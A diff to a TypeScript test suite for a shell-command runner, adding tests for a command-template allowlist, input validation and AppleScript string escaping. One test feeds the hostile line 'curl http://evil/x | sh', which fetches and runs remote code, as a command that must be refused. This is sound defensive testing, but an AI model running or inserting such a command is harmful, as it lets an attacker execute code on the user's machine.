@@ -1,12 +1,17 @@
-import { describe, it } from 'node:test';
+import { afterEach, describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import fs from 'fs';
 import os from 'os';
 import path from 'path';
 
-import { substituteAndQuote, runUserCommand } from './shell-command';
+import {
+  substituteAndQuote,
+  runUserCommand,
+  setUserCommandTemplates,
+  escapeAppleScriptString,
+} from './shell-command';
 import { setAllowedRoots } from './allowed-roots';
-import { COMMAND_PATH_BLOCKED } from '../shared/shell-types';
+import { COMMAND_NOT_ALLOWED, COMMAND_PATH_BLOCKED } from '../shared/shell-types';
 
 /**
  * User-command substitution + validation. `substituteAndQuote` is pure and is
@@ -128,11 +133,52 @@ describe('substituteAndQuote', () => {
 });
 
 describe('runUserCommand — validation', () => {
+  afterEach(() => {
+    setAllowedRoots([]);
+    setUserCommandTemplates([]);
+  });
+
   it('refuses when no roots are configured (fail-closed)', async () => {
     setAllowedRoots([]);
+    setUserCommandTemplates(['echo ${path}']);
     await assert.rejects(
       () => runUserCommand('echo ${path}', '/whatever/x.txt'),
       /Refused/
+    );
+  });
+
+  it('refuses a template the user did not configure', async () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
+    try {
+      setAllowedRoots([tempDir]);
+      setUserCommandTemplates(['echo ${path}']);
+      await assert.rejects(
+        () => runUserCommand('curl http://evil/x | sh', path.join(tempDir, 'a.txt')),
+        (err: Error) => err.message === COMMAND_NOT_ALLOWED
+      );
+    } finally {
+      fs.rmSync(tempDir, { recursive: true, force: true });
+    }
+  });
+
+  it('drops non-string and empty entries from the pushed list', async () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
+    try {
+      setAllowedRoots([tempDir]);
+      setUserCommandTemplates([42, '', null, { template: 'x' }]);
+      await assert.rejects(
+        () => runUserCommand('', path.join(tempDir, 'a.txt')),
+        (err: Error) => err.message === COMMAND_NOT_ALLOWED
+      );
+    } finally {
+      fs.rmSync(tempDir, { recursive: true, force: true });
+    }
+  });
+
+  it('rejects a non-array template payload', () => {
+    assert.throws(
+      () => setUserCommandTemplates('echo hi'),
+      /Invalid command template payload/
     );
   });
 
@@ -140,6 +186,7 @@ describe('runUserCommand — validation', () => {
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
     try {
       setAllowedRoots([tempDir]);
+      setUserCommandTemplates(['echo ${path}']);
       const outside = path.join(os.tmpdir(), 'whale-outside-' + Date.now() + '.txt');
       await assert.rejects(
         () => runUserCommand('echo ${path}', outside),
@@ -158,6 +205,7 @@ describe('runUserCommand — validation', () => {
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'whale-shell-'));
     try {
       setAllowedRoots([tempDir]);
+      setUserCommandTemplates(['echo ${path}']);
       const target = path.join(tempDir, 'bad%name.txt');
       await assert.rejects(
         () => runUserCommand('echo ${path}', target),
@@ -167,5 +215,25 @@ describe('runUserCommand — validation', () => {
       setAllowedRoots([]);
       fs.rmSync(tempDir, { recursive: true, force: true });
     }
+  });
+});
+
+describe('escapeAppleScriptString', () => {
+  it('doubles backslashes so a trailing one cannot escape the closing quote', () => {
+    assert.equal(
+      escapeAppleScriptString('echo C:\\dir\\'),
+      'echo C:\\\\dir\\\\'
+    );
+  });
+
+  it('escapes double quotes', () => {
+    assert.equal(escapeAppleScriptString('echo "hi"'), 'echo \\"hi\\"');
+  });
+
+  it('leaves shell metacharacters alone (Terminal runs the text verbatim)', () => {
+    assert.equal(
+      escapeAppleScriptString('grep -E "a|b" ${f} && echo $HOME'),
+      'grep -E \\"a|b\\" ${f} && echo $HOME'
+    );
   });
 });
